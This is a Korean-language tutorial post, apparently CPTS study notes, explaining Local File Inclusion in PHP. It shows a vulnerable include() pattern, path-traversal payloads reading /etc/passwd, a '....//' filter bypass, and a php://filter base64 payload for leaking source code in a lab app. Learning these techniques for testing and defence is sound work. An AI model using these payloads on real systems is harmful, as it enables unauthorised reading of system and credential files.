---
title: "LFI - File Disclosure"
date: 2026-06-11
layout: single
excerpt: "LFI, Local File Inclusion은 웹 애플리케이션이 서버 내부의 파일을 불러오는 기능을 처리할 때, 사용자의 입력값을 제대로 검증하지 않아 발생하는 취약점이다. 예를 들어 애플리케이션이 특정 페이지나 템플릿 파일을 불러오기 위해 파일명을 파라미터로 받는다고 가정한다면 이때 입력값에 대한 검증이 부족하면 공격자는 의도된 파일이 아닌 서버 내부의 민감한 파일을 읽도록 요청을 조작할 수 있다."
author_profile: true
toc: true
toc_label: "LFI"
toc_icon: "book"
toc_sticky: true
categories: [cpts-web]
tags: [web, cpts, lfi]
---

**LFI**, **Local File Inclusion**은 웹 애플리케이션이 서버 내부의 파일을 불러오는 기능을 처리할 때, 사용자의 입력값을 제대로 검증하지 않아 발생하는 취약점이다.

예를 들어 애플리케이션이 특정 페이지나 템플릿 파일을 불러오기 위해 파일명을 파라미터로 받는다고 가정한다면 이때 입력값에 대한 검증이 부족하면 공격자는 의도된 파일이 아닌 서버 내부의 민감한 파일을 읽도록 요청을 조작할 수 있다.

# Local File Inclusion (LFI)

**LFI**는 주로 PHP의 `include`, `require` 같은 함수에서 자주 발생하며, 그 외에도 파일 다운로드 기능이나 파일 뷰어 기능처럼 서버 내부의 파일 경로를 참조하는 기능에서도 발생할 수 있다.

예를 들어 아래와 같이 언어를 선택하는 기능이 있다고 가정해보자:

![LFI](/assets/cpts-web/lfi-file-disclosure/lfi1.png)

URL을 보면 `language` 파라미터에 `en.php` 파일이 전달되고 있는 것을 확인할 수 있다.

```url
/index.php?language=en.php
```

이 경우 서버 내부에서는 대략 다음과 같은 방식으로 파일을 불러오고 있을 가능성이 있다:

```php
include($_GET['language']);
```

정상적인 요청이라면 `language=en.php` 값이 전달되고, 서버에서는 `en.php` 파일을 `include` 하여 영어 페이지를 출력한다:

```php
include('en.php');
```

하지만 만약 사용자의 입력값에 대한 검증이 없다면, 공격자는 `language` 파라미터에 의도된 언어 파일이 아닌 다른 파일 경로를 전달할 수 있다.

예를 들어 `/etc/passwd` 파일을 읽기 위해 상대 경로인 `../` 를 사용하면 다음과 같은 요청을 보낼 수 있다:

```php
include('../../../../etc/passwd');
```

실제로 상대 경로를 통하여 시스템 파일을 불러오게 되고, `/etc/passwd` 파일의 내용이 페이지에 출력된다:

![LFI](/assets/cpts-web/lfi-file-disclosure/lfi2.png)

# Basic Bypasses

만약 내부에서 이런 필터가 존재한다고 가정해보자:

```php
$language = str_replace('../', '', $_GET['language']);
```

위 필터는 `../` 문자열이 발견되면 해당 문자열을 빈 문자열로 치환한다.

하지만 이 필터는 재귀적으로 동작하지 않기 때문에 `....//` 같은 문자열로 우회할 수 있다.

예를 들어 `....//` 안에는 중간에 `../` 패턴이 포함되어 있고, 해당 부분이 제거되면 남은 `..` 과 `/` 가 합쳐져 최종적으로 `../` 가 된다:

```text
....// → ../
```

즉 필터링 이후에도 다시 `../` 패턴이 만들어질 수 있기 때문에 우회가 가능하다.

실제로 확인해보면 다음과 같이 LFI가 발생하는 것을 볼 수 있다:

![LFI](/assets/cpts-web/lfi-file-disclosure/lfi3.png)

# PHP Filters

LFI에서는 **PHP wrapper**를 이용해 파일을 읽는 것도 가능하다. 대표적으로 `php://filter` wrapper를 사용할 수 있다.

```text
php://filter/read=convert.base64-encode/resource=index
```

내부에서 `include()` 함수가 사용되고 있다면, 이 wrapper를 이용해 PHP 파일을 실행하지 않고 base64로 인코딩된 형태로 출력하게 만들 수 있다:

![LFI](/assets/cpts-web/lfi-file-disclosure/lfi4.png)

만약 애플리케이션 내부 코드가 다음과 같이 동작한다고 가정해보자:

```php
include($lang);
```

사용자가 `language` 파라미터에 다음 값을 넣으면:

```text
php://filter/read=convert.base64-encode/resource=index.php
```

내부에서는 최종적으로 다음과 같이 처리된다:

```php
include("php://filter/read=convert.base64-encode/resource=index.php");
```

디코딩 결과를 확인해보면 다음과 같이 실제 `index.php` 소스코드를 확인할 수 있다:

```bash
$ echo "PCFET0NUWVBFIGh0bWw+Cjw/cGhwCmlmIChpc3NldCgkX0dFVFsnbGFuZ3VhZ2UnXSkpIHsKICAgICRsYW5nID0gJF9HRVRbJ2xhbmd1YWdlJ107Cn0gZWxzZSB7CiAgICAkbGFuZyA9ICJlbiI7Cn0KPz4KPGh0bWwgbGFuZz0iZW4iPgoKPGhlYWQ+CiAgICA8bWV0YSBjaGFyc2V0PSJVVEYtOCI+CiAgICA8dGl0bGU+SW5sYW5lIEZyZWlnaHQ8L3RpdGxlPgogICAgPG1ldGEgbmFtZT0idmlld3BvcnQiIGNvbnRlbnQ9IndpZHRoPWRldmljZS13aWR0aCwgaW5pdGlhbC1zY2FsZT0xIj4KICAgIDxsaW5rIGhyZWY9Imh0dHBzOi8vZm9udHMuZ29vZ2xlYXBpcy5jb20vY3NzP2ZhbWlseT1Qb3BwaW5zOjMwMCw0MDAsNzAwIiByZWw9InN0eWxlc2hlZXQiPgogICAgPGxpbmsgcmVsPSdzdHlsZXNoZWV0JyBocmVmPSdodHRwczovL2NkbmpzLmNsb3VkZmxhcmUuY29tL2FqYXgvbGlicy9mb250LWF3ZXNvbWUvNC40LjAvY3NzL2ZvbnQtYXdlc29tZS5taW4uY3NzJz4KICAgIDxsaW5rIHJlbD0ic3R5bGVzaGVldCIgaHJlZj0iLi9zdHlsZS5jc3MiPgo8L2hlYWQ+Cgo8Ym9keT4KICAgIDxkaXYgY2xhc3M9Im5hdmJhciI+CiAgICAgICAgPGEgaHJlZj0iI2hvbWUiPklubGFuZSBGcmVpZ2h0PC9hPgogICAgICAgIDxkaXYgY2xhc3M9ImRyb3Bkb3duIj4KICAgICAgICAgICAgPGJ1dHRvbiBjbGFzcz0iZHJvcGJ0biI+TGFuZ3VhZ2UKICAgICAgICAgICAgICAgIDxpIGNsYXNzPSJmYSBmYS1jYXJldC1kb3duIj48L2k+CiAgICAgICAgICAgIDwvYnV0dG9uPgogICAgICAgICAgICA8ZGl2IGNsYXNzPSJkcm9wZG93bi1jb250ZW50Ij4KICAgICAgICAgICAgICAgIDxhIGhyZWY9ImluZGV4LnBocD9sYW5ndWFnZT1lbiI+RW5nbGlzaDwvYT4KICAgICAgICAgICAgICAgIDxhIGhyZWY9ImluZGV4LnBocD9sYW5ndWFnZT1lcyI+U3BhbmlzaDwvYT4KICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgPC9kaXY+CiAgICA8L2Rpdj4KICAgIDwhLS0gcGFydGlhbDppbmRleC5wYXJ0aWFsLmh0bWwgLS0+CiAgICA8ZGl2IGNsYXNzPSJibG9nLWNhcmQiPgogICAgICAgIDxkaXYgY2xhc3M9Im1ldGEiPgogICAgICAgICAgICA8ZGl2IGNsYXNzPSJwaG90byIgc3R5bGU9ImJhY2tncm91bmQtaW1hZ2U6IHVybCguL2ltYWdlLmpwZykiPjwvZGl2PgogICAgICAgICAgICA8dWwgY2xhc3M9ImRldGFpbHMiPgogICAgICAgICAgICAgICAgPGxpIGNsYXNzPSJhdXRob3IiPjxhIGhyZWY9IiMiPkpvaG4gRG9lPC9hPjwvbGk+CiAgICAgICAgICAgICAgICA8bGkgY2xhc3M9ImRhdGUiPkF1Zy4gMjQsIDIwMTk8L2xpPgogICAgICAgICAgICA8L3VsPgogICAgICAgIDwvZGl2PgogICAgICAgIDxkaXYgY2xhc3M9ImRlc2NyaXB0aW9uIj4KICAgICAgICAgICAgPGgxPkhpc3Rvcnk8L2gxPgogICAgICAgICAgICA8aDI+Q29udGFpbmVyczwvaDI+CiAgICAgICAgICAgIDw/cGhwCiAgICAgICAgICAgIGluY2x1ZGUoJGxhbmcgLiAiLnBocCIpOwogICAgICAgICAgICBlY2hvICRwMjsKICAgICAgICAgICAgPz4KICAgICAgICAgICAgPHAgY2xhc3M9InJlYWQtbW9yZSI+CiAgICAgICAgICAgICAgICA8YSBocmVmPSIjIj5SZWFkIE1vcmU8L2E+CiAgICAgICAgICAgIDwvcD4KICAgICAgICA8L2Rpdj4KICAgIDwvZGl2PgogICAgPGRpdiBjbGFzcz0iYmxvZy1jYXJkIGFsdCI+CiAgICAgICAgPGRpdiBjbGFzcz0ibWV0YSI+CiAgICAgICAgICAgIDxkaXYgY2xhc3M9InBob3RvIiBzdHlsZT0iYmFja2dyb3VuZC1pbWFnZTogdXJsKC4vaW1hZ2UuanBnKSI+PC9kaXY+CiAgICAgICAgICAgIDx1bCBjbGFzcz0iZGV0YWlscyI+CiAgICAgICAgICAgICAgICA8bGkgY2xhc3M9ImF1dGhvciI+PGEgaHJlZj0iIyI+SmFuZSBEb2U8L2E+PC9saT4KICAgICAgICAgICAgICAgIDxsaSBjbGFzcz0iZGF0ZSI+SnVseS4gMTUsIDIwMTk8L2xpPgogICAgICAgICAgICA8L3VsPgogICAgICAgIDwvZGl2PgogICAgICAgIDxkaXYgY2xhc3M9ImRlc2NyaXB0aW9uIj4KICAgICAgICAgICAgPGgxPkNvbnRhaW5lciBJbmR1c3RyeTwvaDE+CiAgICAgICAgICAgIDxoMj5PcGVuaW5nIGEgZG9vciB0byB0aGUgZnV0dXJlPC9oMj4KICAgICAgICAgICAgPHA+TG9yZW0gaXBzdW0gZG9sb3Igc2l0IGFtZXQsIGNvbnNlY3RldHVyIGFkaXBpc2ljaW5nIGVsaXQuIEFkIGV1bSBkb2xvcnVtIGFyY2hpdGVjdG8gb2JjYWVjYXRpIGVuaW0gZGljdGEKICAgICAgICAgICAgICAgIHByYWVzZW50aXVtLCBxdWFtIG5vYmlzISBOZXF1ZSBhZCBhbGlxdWFtIGZhY2lsaXMgbnVtcXVhbS4gVmVyaXRhdGlzLCBzaXQuPC9wPgogICAgICAgICAgICA8cCBjbGFzcz0icmVhZC1tb3JlIj4KICAgICAgICAgICAgICAgIDxhIGhyZWY9IiMiPlJlYWQgTW9yZTwvYT4KICAgICAgICAgICAgPC9wPgogICAgICAgIDwvZGl2PgogICAgPC9kaXY+CiAgICA8IS0tIHBhcnRpYWwgLS0+CjwvYm9keT4KCjwvaHRtbD4=" | base64 -d

<?php
if (isset($_GET['language'])) {
    $lang = $_GET['language'];
} else {
    $lang = "en";
}
?>
<html lang="en">

# SKIP
        <div class="description">
            <h1>History</h1>
            <h2>Containers</h2>
            <?php
            include($lang . ".php");
            echo $p2;
            ?>
            <p class="read-more">
                <a href="#">Read More</a>
            </p>
# SKIP
</html>
```

이를 통해 내부에서 `language` 파라미터 값이 `include()` 함수로 전달되고 있으며, 뒤에 `.php` 확장자가 붙는다는 사실을 확인할 수 있다.

정리하면, `php://filter/read=convert.base64-encode/resource=index` 는 `index.php` 파일을 직접 실행하지 않고 base64로 인코딩된 소스코드 형태로 읽기 위해 사용하는 페이로드이다. 

이 기법은 LFI 상황에서 PHP 파일의 소스코드나 설정 파일을 확인할 때 자주 사용된다.
